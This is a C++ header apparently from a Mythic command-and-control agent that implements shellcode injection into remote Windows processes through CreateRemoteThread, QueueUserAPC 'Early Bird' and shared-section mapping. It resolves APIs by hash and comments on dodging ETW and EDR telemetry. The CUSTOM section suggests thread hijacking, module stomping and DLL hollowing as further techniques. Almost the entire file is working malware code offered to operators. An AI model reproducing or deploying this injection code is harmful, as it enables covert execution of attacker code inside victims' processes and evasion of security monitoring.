#ifndef STARBURST_EVASION_INJECTION_TECHNIQUES_H
#define STARBURST_EVASION_INJECTION_TECHNIQUES_H

/*
 * Injection techniques - operator-customizable remote injection.
 *
 * This file provides a compile-time selectable injection primitive
 * used by cmd_shinject and cmd_migrate. The pattern follows
 * spoof_profiles.h: preprocessor selection via INJECTION_TECHNIQUE.
 *
 * WORKFLOW - Swapping techniques:
 *
 *   1. Select a technique in the Mythic build dialog, or set
 *      #define INJECTION_TECHNIQUE INJECT_* in config.h for manual builds.
 *
 *   2. For INJECT_CUSTOM, edit the custom section below with your own
 *      injection logic. The function signature must match inject_shellcode().
 *
 * AVAILABLE TECHNIQUES:
 *
 *   INJECT_CRT       - CreateRemoteThread (baseline, most compatible)
 *   INJECT_APC       - QueueUserAPC Early Bird (requires suspended process)
 *   INJECT_SECTION   - NtCreateSection + NtMapViewOfSection (no VirtualAllocEx)
 *   INJECT_CUSTOM    - Operator-defined injection logic
 *
 * ALL techniques share the same interface:
 *   inject_shellcode(inst, h_proc, data, len) -> HANDLE to thread/NULL
 *
 * The caller (cmd_shinject/cmd_migrate) handles OpenProcess and cleanup.
 */

#include <constexpr.h>
#include <stdint.h>

#define INJECT_CRT     0
#define INJECT_APC     1
#define INJECT_SECTION 2
#define INJECT_CUSTOM  3

#ifndef INJECTION_TECHNIQUE
#define INJECTION_TECHNIQUE INJECT_CRT
#endif

/*
 * inject_shellcode - Write and execute shellcode in a remote process.
 *
 * Parameters:
 *   inst   - agent instance (for API resolution)
 *   h_proc - handle to target process (PROCESS_ALL_ACCESS)
 *   data   - shellcode buffer
 *   len    - shellcode length
 *
 * Returns:
 *   Thread/object handle on success, NULL on failure.
 *   Caller is responsible for closing returned handle.
 */

#if INJECTION_TECHNIQUE == INJECT_CRT

/* ── CreateRemoteThread ──
 * VirtualAllocEx(RW) → WriteProcessMemory → VirtualProtectEx(RX) → CreateRemoteThread
 * Baseline technique - works everywhere, but generates ETW events for
 * VirtualAllocEx + WriteProcessMemory + CreateRemoteThread in sequence.
 */
static auto declfn inject_shellcode(
    instance& inst, HANDLE h_proc, void* data, uint32_t len
) -> HANDLE {
    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    typedef BOOL   ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    typedef BOOL   ( WINAPI *fn_VirtualProtectEx )( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                     LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto k32 = inst.kernel32.handle;

    auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
    auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
    auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
    auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );

    if ( !pVirtualAllocEx || !pWriteProcessMemory ||
         !pVirtualProtectEx || !pCreateRemoteThread )
        return nullptr;

    LPVOID remote_mem = pVirtualAllocEx(
        h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !remote_mem ) return nullptr;

    SIZE_T written = 0;
    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
        return nullptr;

    DWORD old_protect = 0;
    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );

    return pCreateRemoteThread(
        h_proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr );
}

#elif INJECTION_TECHNIQUE == INJECT_APC

/* ── QueueUserAPC Early Bird ──
 * VirtualAllocEx(RW) → WriteProcessMemory → VirtualProtectEx(RX) → QueueUserAPC
 * Requires a thread in alertable wait state. For shinject, caller should
 * target a thread that's in SleepEx/WaitForSingleObjectEx/etc.
 * For migrate, the agent spawns a suspended process and queues APC to its main thread.
 *
 * OPSEC: No CreateRemoteThread event. APC execution is harder to attribute.
 * Detection: NtQueueApcThread cross-process is still monitored by some EDRs.
 */
static auto declfn inject_shellcode(
    instance& inst, HANDLE h_proc, void* data, uint32_t len
) -> HANDLE {
    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    typedef BOOL   ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    typedef BOOL   ( WINAPI *fn_VirtualProtectEx )( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
    typedef DWORD  ( WINAPI *fn_QueueUserAPC )( PAPCFUNC, HANDLE, ULONG_PTR );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                     LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto k32 = inst.kernel32.handle;

    auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
    auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
    auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
    auto pQueueUserAPC = reinterpret_cast<fn_QueueUserAPC>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "QueueUserAPC" ) ) );
    auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );

    if ( !pVirtualAllocEx || !pWriteProcessMemory ||
         !pVirtualProtectEx || !pQueueUserAPC || !pCreateRemoteThread )
        return nullptr;

    LPVOID remote_mem = pVirtualAllocEx(
        h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !remote_mem ) return nullptr;

    SIZE_T written = 0;
    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
        return nullptr;

    DWORD old_protect = 0;
    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );

    /* Create suspended thread, queue APC, then resume - Early Bird pattern */
    HANDLE h_thread = pCreateRemoteThread(
        h_proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)inst.kernel32.GetProcAddress(
            (HMODULE)k32, symbol<LPCSTR>( "SleepEx" ) ),
        (LPVOID)INFINITE, CREATE_SUSPENDED, nullptr );

    if ( !h_thread ) return nullptr;

    pQueueUserAPC( (PAPCFUNC)remote_mem, h_thread, 0 );

    typedef DWORD ( WINAPI *fn_ResumeThread )( HANDLE );
    auto pResumeThread = reinterpret_cast<fn_ResumeThread>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "ResumeThread" ) ) );
    if ( pResumeThread ) pResumeThread( h_thread );

    return h_thread;
}

#elif INJECTION_TECHNIQUE == INJECT_SECTION

/* ── NtCreateSection + NtMapViewOfSection ──
 * Creates a shared section object, maps RW locally to write shellcode,
 * maps RX into the remote process, then creates a thread at the remote view.
 * No VirtualAllocEx or WriteProcessMemory cross-process calls.
 *
 * OPSEC: Avoids VirtualAllocEx + WriteProcessMemory telemetry.
 * The remote mapping appears as a shared section (blends with legit shared memory).
 * Detection: NtMapViewOfSection cross-process + NtCreateThreadEx is still observable.
 */
static auto declfn inject_shellcode(
    instance& inst, HANDLE h_proc, void* data, uint32_t len
) -> HANDLE {
    typedef NTSTATUS ( NTAPI *fn_NtCreateSection )(
        PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE );
    typedef NTSTATUS ( NTAPI *fn_NtMapViewOfSection )(
        HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T,
        DWORD, ULONG, ULONG );
    typedef NTSTATUS ( NTAPI *fn_NtUnmapViewOfSection )( HANDLE, PVOID );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                     LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto ntd = inst.ntdll.handle;
    auto k32 = inst.kernel32.handle;

    auto pNtCreateSection = reinterpret_cast<fn_NtCreateSection>(
        resolve::_api( ntd, expr::hash_string( "NtCreateSection" ) ) );
    auto pNtMapViewOfSection = reinterpret_cast<fn_NtMapViewOfSection>(
        resolve::_api( ntd, expr::hash_string( "NtMapViewOfSection" ) ) );
    auto pNtUnmapViewOfSection = reinterpret_cast<fn_NtUnmapViewOfSection>(
        resolve::_api( ntd, expr::hash_string( "NtUnmapViewOfSection" ) ) );
    auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );

    if ( !pNtCreateSection || !pNtMapViewOfSection ||
         !pNtUnmapViewOfSection || !pCreateRemoteThread )
        return nullptr;

    LARGE_INTEGER section_size = {};
    section_size.QuadPart = len;

    HANDLE h_section = nullptr;
    NTSTATUS status = pNtCreateSection(
        &h_section, SECTION_ALL_ACCESS, nullptr, &section_size,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr );
    if ( status != 0 || !h_section ) return nullptr;

    /* Map RW into current process to write shellcode */
    PVOID local_view = nullptr;
    SIZE_T view_size = 0;
    status = pNtMapViewOfSection(
        h_section, (HANDLE)-1, &local_view, 0, len, nullptr,
        &view_size, 2 /* ViewUnmap */, 0, PAGE_READWRITE );
    if ( status != 0 || !local_view ) {
        inst.kernel32.CloseHandle( h_section );
        return nullptr;
    }

    /* Copy shellcode into local view (writes through to section) */
    memory::copy( local_view, data, len );

    /* Map RX into remote process */
    PVOID remote_view = nullptr;
    SIZE_T remote_view_size = 0;
    status = pNtMapViewOfSection(
        h_section, h_proc, &remote_view, 0, len, nullptr,
        &remote_view_size, 2, 0, PAGE_EXECUTE_READ );

    /* Unmap local view - no longer needed */
    pNtUnmapViewOfSection( (HANDLE)-1, local_view );
    inst.kernel32.CloseHandle( h_section );

    if ( status != 0 || !remote_view ) return nullptr;

    return pCreateRemoteThread(
        h_proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remote_view, nullptr, 0, nullptr );
}

#elif INJECTION_TECHNIQUE == INJECT_CUSTOM

/* ── Custom injection ── OPERATOR: edit below ──
 *
 * Implement your own injection technique here. Must match the signature:
 *   inject_shellcode(inst, h_proc, data, len) -> HANDLE
 *
 * Examples you might implement:
 *   - Thread hijacking (SuspendThread → GetThreadContext → SetContext → ResumeThread)
 *   - Module stomping (find a loaded DLL, overwrite its .text)
 *   - Phantom DLL hollowing
 *   - Direct syscall variants of any of the above
 *
 * Return a handle to the execution primitive (thread, etc.) or NULL on failure.
 */
static auto declfn inject_shellcode(
    instance& inst, HANDLE h_proc, void* data, uint32_t len
) -> HANDLE {
    /* OPERATOR: Replace this with your injection logic */

    /* Default: fall back to CreateRemoteThread */
    typedef LPVOID ( WINAPI *fn_VirtualAllocEx )( HANDLE, LPVOID, SIZE_T, DWORD, DWORD );
    typedef BOOL   ( WINAPI *fn_WriteProcessMemory )( HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T* );
    typedef BOOL   ( WINAPI *fn_VirtualProtectEx )( HANDLE, LPVOID, SIZE_T, DWORD, PDWORD );
    typedef HANDLE ( WINAPI *fn_CreateRemoteThread )( HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                     LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD );

    auto k32 = inst.kernel32.handle;

    auto pVirtualAllocEx = reinterpret_cast<fn_VirtualAllocEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualAllocEx" ) ) );
    auto pWriteProcessMemory = reinterpret_cast<fn_WriteProcessMemory>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "WriteProcessMemory" ) ) );
    auto pVirtualProtectEx = reinterpret_cast<fn_VirtualProtectEx>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "VirtualProtectEx" ) ) );
    auto pCreateRemoteThread = reinterpret_cast<fn_CreateRemoteThread>(
        inst.kernel32.GetProcAddress( (HMODULE)k32, symbol<LPCSTR>( "CreateRemoteThread" ) ) );

    if ( !pVirtualAllocEx || !pWriteProcessMemory ||
         !pVirtualProtectEx || !pCreateRemoteThread )
        return nullptr;

    LPVOID remote_mem = pVirtualAllocEx(
        h_proc, nullptr, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( !remote_mem ) return nullptr;

    SIZE_T written = 0;
    if ( !pWriteProcessMemory( h_proc, remote_mem, data, len, &written ) )
        return nullptr;

    DWORD old_protect = 0;
    pVirtualProtectEx( h_proc, remote_mem, len, PAGE_EXECUTE_READ, &old_protect );

    return pCreateRemoteThread(
        h_proc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remote_mem, nullptr, 0, nullptr );
}

#endif

#endif
